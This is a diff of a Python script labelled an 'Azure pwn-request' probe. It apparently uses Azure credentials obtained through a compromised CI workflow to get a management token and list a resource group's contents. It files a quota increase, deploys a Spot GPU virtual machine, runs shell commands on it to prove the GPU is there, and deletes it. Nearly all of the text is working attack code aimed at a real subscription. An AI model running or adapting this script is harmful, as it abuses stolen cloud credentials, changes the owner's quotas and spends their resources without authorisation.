@@ -1,18 +1,20 @@
 #!/usr/bin/env python3
-"""C211 i120447 probe v6 (mslearn-mlops Azure pwn-request, continuation of i120316):
-- ARM token via azure/login static creds
-- list ALL resources in chriso-sandbox-rg first (independent leak check for the v5 run)
-- pre-clean any leftover c211-i120316-* / c211-i120447-* VM/NIC/vnet with 404 readback
-- pick the single fitting NV4as_v4 (standardNVSv4Family quota 4) in a normal region
-- create vnet+subnet in the EXISTING RG, wait for Succeeded, retry NIC/VM on 429
-- deploy EXACTLY ONE nonce-tagged on-demand VM, capture GPU device proof via runCommand
-  (lspci/DRM ids/nvidia-smi/rocm-smi), independent ARM readback (VM get + list + tag filter)
-- teardown VM/NIC/vnet and prove absence
-- INCREMENTAL progress markers on every step (v5 died in emit() after the work and lost all output)
+"""C211 i120559 probe v10 (mslearn-mlops Azure pwn-request, continuation of i120447/i120316):
+- ARM token via azure/login static creds (az account get-access-token)
+- full RG resource inventory (names) + pre-clean of ONLY c211-* leftovers with 404 readback
+- PHASE B: Microsoft.Quota discovery (subscription scope + per-compute-location lists) for
+  LowPriorityCores / standardNVSv4Family
+- PHASE C: exactly ONE Microsoft.Quota quota request raising lowPriorityCores to 8 in the first
+  region where Standard_NV4as_v4 is offered (fallback to legacy Microsoft.Capacity serviceLimits
+  only if the Quota RP write is 403/404/405)
+- PHASE D: bounded poll (~8 min) of the quota resource + quotaRequests, recording verbatim state
+- PHASE E: ONLY if the approved limit reaches 4 vCPUs -> exactly ONE nonce-tagged SPOT
+  Standard_NV4as_v4 VM (vnet+NIC+VM in the existing RG), nvidia-smi device proof via runCommand,
+  independent ARM readback, then teardown with 404 / empty-list absence proof
 """
 import argparse, base64, json, os, random, re, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse
 
-INTENT = 'i120447r4'
+INTENT = 'i120559'
 def p(*a): print(*a, flush=True)
 def prog(step, **kw):
     try: p('C211_%s_PROGRESS ' % INTENT + json.dumps({'step': step, 't': time.strftime('%FT%TZ', time.gmtime()), **kw})[:3500])
@@ -25,12 +27,12 @@ def sh(cmd, timeout=180):
 def jget(tok, url):
     req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT})
     try:
-        with urllib.request.urlopen(req, timeout=60) as r: return r.status, json.loads(r.read() or b'{}')
+        with urllib.request.urlopen(req, timeout=90) as r: return r.status, json.loads(r.read() or b'{}')
     except urllib.error.HTTPError as e:
         try: return e.code, json.loads(e.read() or b'{}')
         except Exception: return e.code, {'error': 'http'}
     except Exception as e: return -1, {'error': repr(e)}
-def jcall(tok, method, url, body=None, timeout=120):
+def jcall(tok, method, url, body=None, timeout=180):
     data = json.dumps(body).encode() if body is not None else None
     req = urllib.request.Request(url, data=data, method=method, headers={'Authorization': 'Bearer ' + tok,
         'User-Agent': 'c211-' + INTENT, 'Content-Type': 'application/json'})
@@ -46,7 +48,8 @@ def jcall(tok, method, url, body=None, timeout=120):
     except Exception as e: return -1, {'error': repr(e)}, {}
 
 ARM = 'https://management.azure.com'
-PREFIXES = ('c211-i120316-', 'c211-i120447-')
+PREFIXES = ('c211-i120316-', 'c211-i120447-', 'c211-i120559-')
+QREG_PREF = ['westeurope', 'northeurope', 'westus2', 'southeastasia', 'canadacentral', 'eastus2', 'westus']
 
 def list_rg_resources(tok, sub, RG):
     st, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
@@ -65,7 +68,7 @@ def delete_and_wait(tok, url, check_url):
     return {'delete': sd, 'absence': last}
 
 def preclean(tok, sub, RG, R):
-    """Delete any leftover resource of ours (VM first, then NIC, then vnet) with 404 readback."""
+    """Delete any leftover resource of OURS (c211-* only) with 404 readback. Never touches non-c211 resources."""
     R['preclean'] = []
     st0, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
     items = [{'name': r.get('name'), 'type': (r.get('type') or '')} for r in (rs.get('value') or [])] if st0 == 200 else []
@@ -85,6 +88,275 @@ def preclean(tok, sub, RG, R):
     left = [r.get('name') for r in (rs1.get('value') or []) if any(str(r.get('name')).startswith(pre) for pre in PREFIXES)] if st1 == 200 else rs1
     R['preclean_after'] = {'status': st1, 'left': left}
     prog('preclean_after', status=st1, left=left)
+
+# ---------------- Microsoft.Quota helpers ----------------
+def qname_of(it):
+    nm = it.get('name')
+    nmv = (nm.get('value') if isinstance(nm, dict) else nm) or ''
+    props = it.get('properties') or {}
+    pn = props.get('name')
+    pv = (pn.get('value') if isinstance(pn, dict) else pn) or ''
+    return nmv, pv
+
+def q_sel_item(it):
+    nmv, pv = qname_of(it)
+    props = it.get('properties') or {}
+    return {'id': it.get('id'), 'name': nmv, 'prop_name': pv, 'limit': props.get('limit'),
+            'currentValue': props.get('currentValue'), 'resourceType': props.get('resourceType'),
+            'unit': props.get('unit'), 'quotaPeriod': props.get('quotaPeriod'),
+            'isQuotaApplicable': props.get('isQuotaApplicable'), 'provisioningState': props.get('provisioningState')}
+
+def is_interesting(it):
+    nmv, pv = qname_of(it)
+    blob = (nmv + ' ' + pv + ' ' + str(it.get('id'))).lower()
+    return ('lowpriority' in blob) or ('nvsv4' in blob)
+
+def quota_discover(tok, sub, R):
+    Q = {'sub_scope': None, 'locations': {}, 'put': None, 'poll': [], 'requests': None, 'verdict': None}
+    R['quota'] = Q
+    st, lst = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota/quotas?api-version=2023-02-01')
+    items = (lst.get('value') or []) if st == 200 else []
+    hits = [q_sel_item(it) for it in items if is_interesting(it)]
+    Q['sub_scope'] = {'status': st, 'count': len(items), 'n_hits': len(hits), 'hits': hits[:12],
+                      'err': None if st == 200 else (lst.get('error') if isinstance(lst, dict) else lst)}
+    prog('quota_sub_scope', status=st, count=len(items), n_hits=len(hits), sample=hits[:4],
+         err=Q['sub_scope']['err'])
+    for reg in QREG_PREF:
+        stl, lstl = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotas?api-version=2023-02-01')
+        d = {'status': stl}
+        if stl == 200:
+            its = lstl.get('value') or []
+            d['count'] = len(its)
+            d['sel'] = [q_sel_item(it) for it in its if is_interesting(it)]
+        else:
+            d['err'] = (lstl.get('error') if isinstance(lstl, dict) else lstl)
+        Q['locations'][reg] = d
+        prog('quota_loc', region=reg, status=stl, count=d.get('count'), sel=d.get('sel'), err=d.get('err'))
+        time.sleep(0.4)
+    return Q
+
+def quota_put(tok, sub, reg, Q, R):
+    loc = Q['locations'].get(reg) or {}
+    sel = loc.get('sel') or []
+    lp = None
+    for it in sel:
+        blob = (str(it.get('name')) + ' ' + str(it.get('prop_name'))).lower()
+        if 'lowpriority' in blob:
+            lp = it; break
+    resname = (lp or {}).get('name') or 'lowPriorityCores'
+    rtype = (lp or {}).get('resourceType') or 'lowPriority'
+    unit = (lp or {}).get('unit') or 'Count'
+    body = {'properties': {'limit': 8, 'name': {'value': resname}, 'resourceType': rtype}}
+    url = f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotas/{resname}?api-version=2023-02-01'
+    st, resp, hdr = jcall(tok, 'PUT', url, body)
+    props = (resp.get('properties') or {}) if isinstance(resp, dict) else {}
+    rec = {'region': reg, 'resname': resname, 'resourceType': rtype, 'unit': unit,
+           'url': url, 'body': body, 'status': st,
+           'resp_limit': props.get('limit'), 'resp_state': props.get('provisioningState'),
+           'resp_message': (props.get('message') or '')[:800] if isinstance(props.get('message'), str) else props.get('message'),
+           'err': (resp.get('error') or {}) if isinstance(resp, dict) and st not in (200, 201, 202) else None,
+           'async': hdr.get('Azure-AsyncOperation') or hdr.get('azure-asyncoperation') or hdr.get('Location') or hdr.get('location'),
+           'retry_after': hdr.get('Retry-After')}
+    Q['put'] = rec
+    prog('quota_put', **{k: rec[k] for k in ('region', 'resname', 'resourceType', 'status', 'resp_limit', 'resp_state', 'resp_message', 'err', 'async')})
+    # single alternate resourceType retry ONLY on a 400 shape complaint
+    if st in (400, 409) and isinstance(rec['err'], dict):
+        msg = json.dumps(rec['err']).lower()
+        if 'resourcetype' in msg or 'invalid' in msg or 'badrequest' in msg:
+            alt = 'dedicated' if rtype != 'dedicated' else 'lowPriority'
+            body2 = {'properties': {'limit': 8, 'name': {'value': resname}, 'resourceType': alt}}
+            st2, resp2, hdr2 = jcall(tok, 'PUT', url, body2)
+            props2 = (resp2.get('properties') or {}) if isinstance(resp2, dict) else {}
+            rec2 = {'region': reg, 'resname': resname, 'resourceType': alt, 'url': url, 'body': body2,
+                    'status': st2, 'resp_limit': props2.get('limit'), 'resp_state': props2.get('provisioningState'),
+                    'resp_message': props2.get('message') if isinstance(props2.get('message'), str) else None,
+                    'err': (resp2.get('error') or {}) if isinstance(resp2, dict) and st2 not in (200, 201, 202) else None,
+                    'async': hdr2.get('Azure-AsyncOperation') or hdr2.get('Location')}
+            Q['put_alt'] = rec2
+            prog('quota_put_alt', **{k: rec2[k] for k in ('region', 'resname', 'resourceType', 'status', 'resp_limit', 'resp_state', 'resp_message', 'err')})
+    # legacy Microsoft.Capacity fallback ONLY if the Quota RP itself is denied/absent
+    if st in (403, 404, 405, 501):
+        url2 = f'{ARM}/subscriptions/{sub}/providers/Microsoft.Capacity/resourceProviders/Microsoft.Compute/locations/{reg}/serviceLimits/{resname}?api-version=2020-10-25'
+        body3 = {'properties': {'quota': {'limit': 8, 'unit': 'Count'}, 'name': {'value': resname}}}
+        st3, resp3, hdr3 = jcall(tok, 'PUT', url2, body3)
+        Q['put_legacy'] = {'url': url2, 'status': st3,
+                           'resp': json.dumps(resp3)[:1200] if isinstance(resp3, dict) else str(resp3)[:1200],
+                           'async': hdr3.get('Azure-AsyncOperation') or hdr3.get('Location')}
+        prog('quota_put_legacy', status=st3, resp=Q['put_legacy']['resp'][:600])
+    return Q
+
+def quota_poll(tok, sub, reg, Q, R, max_iter=32, sleep_s=15):
+    rec = Q.get('put') or {}
+    resname = rec.get('resname') or 'lowPriorityCores'
+    url = f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotas/{resname}?api-version=2023-02-01'
+    final = None
+    for i in range(max_iter):
+        time.sleep(sleep_s)
+        st, g = jget(tok, url)
+        props = (g.get('properties') or {}) if isinstance(g, dict) else {}
+        cur = props.get('limit'); ps = props.get('provisioningState')
+        poll = {'i': i, 't': time.strftime('%FT%TZ', time.gmtime()), 'status': st, 'limit': cur, 'state': ps}
+        Q['poll'].append(poll)
+        final = {'limit': cur, 'state': ps, 'status': st}
+        if i % 4 == 0 or (ps in ('Succeeded', 'Rejected', 'Failed', 'Canceled')):
+            prog('quota_poll', i=i, status=st, limit=cur, state=ps)
+        if ps in ('Rejected', 'Failed', 'Canceled'):
+            break
+        if (isinstance(cur, (int, float)) and cur >= 4) and ps in ('Succeeded', 'Accepted', None):
+            # one confirmation read after a short settle
+            time.sleep(3)
+            break
+    # async operation readback if ARM gave us one
+    async_url = rec.get('async')
+    if async_url:
+        au = async_url if str(async_url).startswith('http') else ARM + async_url
+        sta, ga = jget(tok, au)
+        Q['async_final'] = {'status': sta, 'body': json.dumps(ga)[:800]}
+        prog('quota_async', status=sta, body=Q['async_final']['body'][:500])
+    for u in (f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotaRequests?api-version=2023-02-01',
+              f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota/quotaRequests?api-version=2023-02-01'):
+        stq, lq = jget(tok, u)
+        if stq == 200:
+            its = lq.get('value') or []
+            Q['requests'] = {'url': u, 'status': stq, 'count': len(its),
+                             'first': [{k: (it.get('properties') or {}).get(k) for k in ('provisioningState', 'requestSubmitTime', 'value')} for it in its[:5]]}
+            prog('quota_requests', url=u, status=stq, count=len(its), first=Q['requests']['first'])
+            break
+        else:
+            Q['requests'] = {'url': u, 'status': stq, 'err': (lq.get('error') if isinstance(lq, dict) else lq)}
+    final_limit = (final or {}).get('limit')
+    approved = isinstance(final_limit, (int, float)) and final_limit >= 4 and (final or {}).get('state') not in ('Rejected', 'Failed', 'Canceled')
+    Q['verdict'] = {'region': reg, 'resname': resname, 'put_status': rec.get('status'),
+                    'final_limit': final_limit, 'final_state': (final or {}).get('state'), 'approved': approved}
+    prog('quota_verdict', **Q['verdict'])
+    return approved
+
+def deploy_spot(tok, sub, RG, region, sku, sinfo, nonce, R, Q):
+    """Exactly ONE nonce-tagged SPOT VM with device proof + independent readback + teardown."""
+    marker = R.setdefault('marker', {})
+    pre = 'c211-' + INTENT + '-' + nonce
+    vnet = pre + '-' + region + '-vnet'; sn = pre + '-' + region + '-subnet'
+    nic = pre + '-' + region + '-nic'; vm = pre + '-' + region + '-vm'
+    marker.update({'attempted': True, 'nonce': nonce, 'priority': 'Spot', 'region': region, 'sku': sku,
+                   'gpu_name': sinfo.get('gpu_name'), 'rg': RG,
+                   'names': {'vnet': vnet, 'subnet': sn, 'nic': nic, 'vm': vm, 'region': region}})
+    prog('attempt_start', region=region, sku=sku, names=marker['names'])
+    steps = {}
+    marker['steps'] = steps
+    vb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
+          'properties': {'addressSpace': {'addressPrefixes': ['10.211.0.0/16']},
+                         'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.211.1.0/24'}}]}}
+    s1, r1, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01', vb)
+    steps['vnet_create'] = {'status': s1, 'err': (r1.get('error') or {}) if isinstance(r1, dict) and s1 not in (200, 201) else None}
+    prog('vnet_create', status=s1, err=steps['vnet_create']['err'])
+    if s1 not in (200, 201):
+        cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R, marker=marker); return False
+    settle = None
+    for i in range(36):
+        stsv, vs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
+        props = (vs.get('properties') or {}) if stsv == 200 else {}
+        vp = props.get('provisioningState')
+        sp = [((s0.get('properties') or {}).get('provisioningState')) for s0 in (props.get('subnets') or [])]
+        settle = {'vnet': vp, 'subnets': sp, 'status': stsv}
+        if stsv == 200 and vp == 'Succeeded' and all(x == 'Succeeded' for x in sp): break
+        time.sleep(5)
+    steps['vnet_settle'] = settle
+    prog('vnet_settle', settle=settle)
+    subnet_id = f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}/subnets/{sn}'
+    nb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
+          'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
+    s2 = None; r2 = None; tries = []
+    for i in range(15):
+        s2, r2, h2 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nb)
+        tries.append({'status': s2, 'retry_after': h2.get('Retry-After'), 'code': ((r2.get('error') or {}).get('code') if isinstance(r2, dict) else None)})
+        if s2 in (200, 201): break
+        time.sleep(12)
+    steps['nic_create'] = {'status': s2, 'tries': tries, 'err': (r2.get('error') or {}) if s2 not in (200, 201) else None}
+    prog('nic_create', status=s2, tries=tries)
+    if s2 not in (200, 201):
+        cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R, marker=marker); return False
+    IMAGES = [{'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts', 'version': 'latest'},
+              {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'}]
+    pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
+    s3 = None; r3 = None; vtries = []
+    for im in IMAGES:
+        vmb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
+               'properties': {'hardwareProfile': {'vmSize': sku},
+                              'priority': 'Spot', 'evictionPolicy': 'Deallocate', 'billingProfile': {'maxPrice': -1},
+                              'storageProfile': {'imageReference': im,
+                                                 'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
+                              'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
+                                            'linuxConfiguration': {'disablePasswordAuthentication': False}},
+                              'networkProfile': {'networkInterfaces': [{'id': r2.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
+        s3 = None; r3 = None
+        for i in range(12):
+            s3, r3, h3 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmb, timeout=240)
+            vtries.append({'status': s3, 'image': im['sku'], 'retry_after': h3.get('Retry-After'), 'code': ((r3.get('error') or {}).get('code') if isinstance(r3, dict) else None)})
+            if s3 in (200, 201): break
+            if s3 != 429: break
+            time.sleep(15)
+        steps['vm_create'] = {'status': s3, 'image': im['sku'], 'tries': vtries,
+                              'err': (r3.get('error') or {}) if isinstance(r3, dict) and s3 not in (200, 201) else None}
+        prog('vm_create', status=s3, image=im['sku'], tries=vtries, err=steps['vm_create']['err'])
+        if s3 in (200, 201): break
+        if s3 != 400: break
+    if s3 not in (200, 201):
+        cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=None, R=R, marker=marker); return False
+    ok = False; prov = None; ivstat = None
+    for i in range(40):
+        time.sleep(12)
+        stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
+        prov = ((g.get('properties') or {}).get('provisioningState'))
+        if prov in ('Succeeded', 'Failed'): ok = prov == 'Succeeded'; break
+    marker['provision_state'] = prov; marker['provisioned'] = ok
+    steps['provision_state'] = prov
+    ig, inst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01')
+    ivstat = [{'code': x.get('code'), 'level': x.get('level'), 'message': (x.get('message') or '')[:600]} for x in ((inst.get('statuses') or []) if ig == 200 else [])]
+    marker['instance_view_statuses'] = ivstat
+    prog('provision', state=prov, ok=ok, ivstat=ivstat, get_status=ig)
+    dev_evidence = None
+    if ok:
+        time.sleep(20)
+        script = ("echo ---SMI-L---; (nvidia-smi -L || echo NO_NVIDIA_SMI) 2>&1; "
+                  "echo ---SMI-Q---; (nvidia-smi --query-gpu=name,uuid,memory.total --format=csv || echo NO_SMI_QUERY) 2>&1; "
+                  "echo ---LSPCI---; (lspci -nn | grep -i -E 'vga|3d|display|nvidia' || echo NO_LSPCI_GPU) 2>&1; "
+                  "echo ---MOD---; (lsmod | grep -i nvidia || echo NO_NVIDIA_MODULE) 2>&1; "
+                  "echo ---DRM---; (for d in /sys/class/drm/card*/device; do [ -e \"$d\" ] && { echo DEV=$d; cat $d/vendor 2>/dev/null; cat $d/device 2>/dev/null; echo; }; done) 2>&1; "
+                  "echo ---HW---; (lshw -C display 2>/dev/null | head -40 || true); echo ---UNAME---; uname -r")
+        rc_body = {'commandId': 'RunShellScript', 'script': [script]}
+        s4, r4, h4 = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', rc_body)
+        steps['runcommand_submit'] = {'status': s4}
+        prog('runcommand_submit', status=s4)
+        pollurl = h4.get('Azure-AsyncOperation') or h4.get('Location')
+        marker['runcommand_pollurl_present'] = bool(pollurl)
+        captured = None
+        if pollurl:
+            for i in range(34):
+                time.sleep(8)
+                st5, r5 = jget(tok, pollurl if str(pollurl).startswith('http') else ARM + pollurl)
+                sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
+                if sval in ('Succeeded', 'Failed'): captured = r5; break
+        blob = json.dumps(captured or {})
+        msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,8000})"', blob)[:8]
+        marker['runcommand_messages'] = [m[:6000] for m in msgs]
+        marker['runcommand_status'] = ((captured or {}).get('properties', {}) or {}).get('status') if isinstance(captured, dict) else None
+        marker['device_signals'] = [x for x in re.findall(r'(GPU-[0-9a-f-]{16,}|10de:[0-9a-f]{4}|Tesla[^"\\]{0,40}|NVIDIA[^"\\]{0,80}|A10[^"\\]{0,20}|V100[^"\\]{0,20}|T4[^"\\]{0,10})', blob)][:20]
+        dev_evidence = {'signals': marker['device_signals'], 'runcommand_status': marker['runcommand_status'],
+                        'messages': marker['runcommand_messages'][:3]}
+        prog('device_proof', **dev_evidence)
+    stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
+    marker['list_with_marker'] = {'status': stl, 'present': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else lst}
+    stget, vget = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
+    vprops = (vget.get('properties') or {}) if isinstance(vget, dict) else {}
+    marker['vm_get'] = {'status': stget, 'name': vget.get('name'),
+                        'size': (vprops.get('hardwareProfile') or {}).get('vmSize'),
+                        'priority': vprops.get('priority'), 'evictionPolicy': vprops.get('evictionPolicy'),
+                        'tags': vget.get('tags'), 'provisioningState': vprops.get('provisioningState')}
+    prog('readback', list=marker['list_with_marker'], vm_get=marker['vm_get'])
+    cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=vm, R=R, marker=marker)
+    prog('cleanup', cleanup=marker.get('cleanup'))
+    marker['device_evidence'] = dev_evidence
+    return bool(dev_evidence and dev_evidence.get('signals'))
 
 def main():
     ap = argparse.ArgumentParser(); ap.parse_known_args()
@@ -117,250 +389,74 @@ def main():
     if not RG:
         R['fatal'] = 'no chriso-sandbox-rg'; emit(R); return
     R['rg_resources_before'] = list_rg_resources(tok, sub, RG)
-    prog('rg_resources_before', **{k: R['rg_resources_before'][k] for k in ('status', 'count', 'ours')})
-    # ---- pre-clean leftovers (v5 may have leaked; also cleans any earlier attempt) ----
+    prog('rg_resources_before', status=R['rg_resources_before'].get('status'),
+         count=R['rg_resources_before'].get('count'), names=R['rg_resources_before'].get('all_names'),
+         ours=R['rg_resources_before'].get('ours'))
     preclean(tok, sub, RG, R)
-    # ---- SKU catalog: ONE call, client-side location filter ----
+
+    # ---- SKU catalog: which regions offer Standard_NV4as_v4 ----
     sts, cat = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01')
     R['sku_catalog_status'] = sts
     R['sku_catalog_count'] = len(cat.get('value') or []) if sts == 200 else 0
-    GPU_RE = re.compile(r'^Standard_(NC|ND|NV)')
-    skus = []
+    nv4 = []
     for s in (cat.get('value') or []):
-        nm = s.get('name', '')
-        if not GPU_RE.match(nm): continue
+        if s.get('name') != 'Standard_NV4as_v4': continue
         caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
-        try: vc = int(caps.get('vCPUs') or 999)
-        except Exception: vc = 999
-        restr = s.get('restrictions') or []
-        loc_restr = []
-        for r in restr:
-            if r.get('type') == 'Location':
-                for l in ((r.get('restrictionInfo') or {}).get('locations') or []):
-                    l2 = l.lower().replace(' ', '')
-                    if l2 not in loc_restr: loc_restr.append(l2)
-        zrestr = [r for r in restr if r.get('type') == 'Zone']
-        zones = []
-        for r in zrestr:
-            for z in ((r.get('restrictionInfo') or {}).get('zones') or []):
-                if z not in zones: zones.append(z)
-        skus.append({'sku': nm, 'family': s.get('family'), 'vcpus': vc, 'gpus': caps.get('GPUs'),
-                     'gpu_name': caps.get('GPU'), 'locs': [l.lower().replace(' ', '') for l in (s.get('locations') or [])],
-                     'loc_restr': loc_restr, 'zones': zones})
-    R['gpu_skus_offered'] = len(skus)
-    _m = sorted(skus, key=lambda x: (x['vcpus'], x['sku']))
-    R['gpu_sku_matrix_total'] = len(_m)
-    R['gpu_sku_matrix'] = [{'sku': s['sku'], 'family': s['family'], 'vcpus': s['vcpus'], 'gpus': s['gpus'], 'gpu': s['gpu_name'],
-                            'n_locs': len(s['locs']), 'locs': s['locs'][:8], 'n_loc_restr': len(s['loc_restr']),
-                            'loc_restr': s['loc_restr'][:5], 'zones': s['zones'][:4]} for s in _m[:40]]
-    regions = set()
-    for s in skus:
+        nv4.append({'locs': [l.lower().replace(' ', '') for l in (s.get('locations') or [])],
+                    'family': s.get('family'), 'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs')})
+    nv4_regions = []
+    for s in nv4:
         for l in s['locs']:
-            if re.match(r'^[a-z]{4,}[a-z0-9]*$', l) and not l.startswith(('att', 'usgov', 'usnat', 'ussec', 'usstage')):
-                regions.add(l)
-    pref_order = ['westeurope', 'northeurope', 'westus2', 'southeastasia', 'canadacentral', 'eastus', 'eastus2',
-                  'japaneast', 'australiaeast', 'centralindia', 'francecentral', 'germanywestcentral', 'uksouth',
-                  'koreacentral', 'northcentralus', 'southcentralus', 'italynorth', 'polandcentral', 'spaincentral',
-                  'chilecentral', 'mexicocentral', 'brazilsouth', 'westus3', 'westus']
-    pref_regions = [r for r in pref_order if r in regions] + sorted(regions - set(pref_order))
-    R['candidate_regions'] = pref_regions
-    qmap = {}
-    for reg in pref_regions[:24]:
-        stu, us = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/usages?api-version=2024-07-01')
-        if stu != 200:
-            qmap[reg] = {'status': stu}; continue
-        fam = {}
-        for u in us.get('value') or []:
-            nm = ((u.get('name') or {}).get('value') or '')
-            if re.match(r'(?i)^standard(NC|ND|NV)', nm):
-                fam[nm.lower()] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0)}
-        qmap[reg] = {'status': 200, 'gpu_families': fam}
-        time.sleep(0.3)
-    R['quota'] = qmap
-    def fam_key(f):
-        f2 = (f or '').lower().replace(' ', '').replace('_', '')
-        f2 = re.sub(r'^standard', '', f2); f2 = re.sub(r'family$', '', f2)
-        return f2
-    TESTED_ALLOCFAIL = {'westeurope', 'northeurope', 'westus2', 'southeastasia', 'canadacentral', 'eastus2'}
-    LEGACY_SMALL = ('Standard_NC6', 'Standard_NV6', 'Standard_NC12', 'Standard_NV12')
-    cands = []
-    for s in skus:
-        for reg in pref_regions[:24]:
-            if reg not in s['locs']: continue
-            if reg in s['loc_restr']: continue
-            q = qmap.get(reg, {})
-            if q.get('status') != 200: continue
-            avail = None
-            for qf, qv in q['gpu_families'].items():
-                if fam_key(qf) == fam_key(s['family']):
-                    avail = qv['limit'] - qv['current']; break
-            if avail is None or s['vcpus'] > avail: continue
-            sku_rank = 0 if s['sku'] == 'Standard_NV4as_v4' else (1 if s['sku'] in LEGACY_SMALL else 2)
-            cands.append(((sku_rank, 1 if reg in TESTED_ALLOCFAIL else 0,
-                           pref_regions.index(reg) if reg in pref_regions else 99, s['vcpus']), reg, s, avail))
-    cands.sort(key=lambda x: x[0])
-    R['sel_candidates'] = [{'region': c[1], 'sku': c[2]['sku'], 'family': c[2]['family'], 'vcpus': c[2]['vcpus'],
-                            'gpus': c[2]['gpus'], 'gpu_name': c[2]['gpu_name'], 'avail': c[3],
-                            'tested_allocfail': c[1] in TESTED_ALLOCFAIL} for c in cands[:20]]
-    prog('selection', n_candidates=len(cands), sel_candidates=R['sel_candidates'])
+            if l not in nv4_regions: nv4_regions.append(l)
+    R['nv4as_v4_regions'] = nv4_regions
+    prog('sku_nv4', regions=nv4_regions, entries=len(nv4), gpus=(nv4[0]['gpus'] if nv4 else None))
 
-    marker = {'attempted': False}; R['marker'] = marker
+    # ---- PHASE B: quota discovery ----
+    Q = quota_discover(tok, sub, R)
+    tgt = None
+    for reg in QREG_PREF:
+        if reg in nv4_regions: tgt = reg; break
+    if tgt is None and nv4_regions: tgt = nv4_regions[0]
+    R['quota_target_region'] = tgt
+    prog('quota_target', region=tgt)
+
+    # ---- PHASE C+D: one quota increase + bounded poll ----
+    approved = False
+    if not tgt:
+        R['quota_skip'] = 'no Standard_NV4as_v4 region in catalog'
+    else:
+        quota_put(tok, sub, tgt, Q, R)
+        try:
+            approved = quota_poll(tok, sub, tgt, Q, R)
+        except Exception as e:
+            prog('quota_poll_error', err=repr(e))
+
+    # ---- PHASE E: exactly ONE spot marker, only when the quota really reached >= 4 vCPU ----
     nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
-    marker['nonce'] = nonce
-    attempts = []
-    R['attempts'] = attempts
-    # image fallback: gen1 first (max compatibility), gen2 only if ARM refuses the image
-    IMAGES = [{'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts', 'version': 'latest'},
-              {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'}]
-    dev_evidence = None
-    for score, region, sinfo, avail in cands[:8]:
-        sku = sinfo['sku']
-        pre = 'c211-' + INTENT + '-' + nonce
-        vnet = pre + '-' + region + '-vnet'; sn = pre + '-' + region + '-subnet'; nic = pre + '-' + region + '-nic'; vm = pre + '-' + region + '-vm'
-        att = {'region': region, 'sku': sku, 'avail': avail, 'sku_zones': sinfo.get('zones'), 'steps': {}}
-        attempts.append(att)
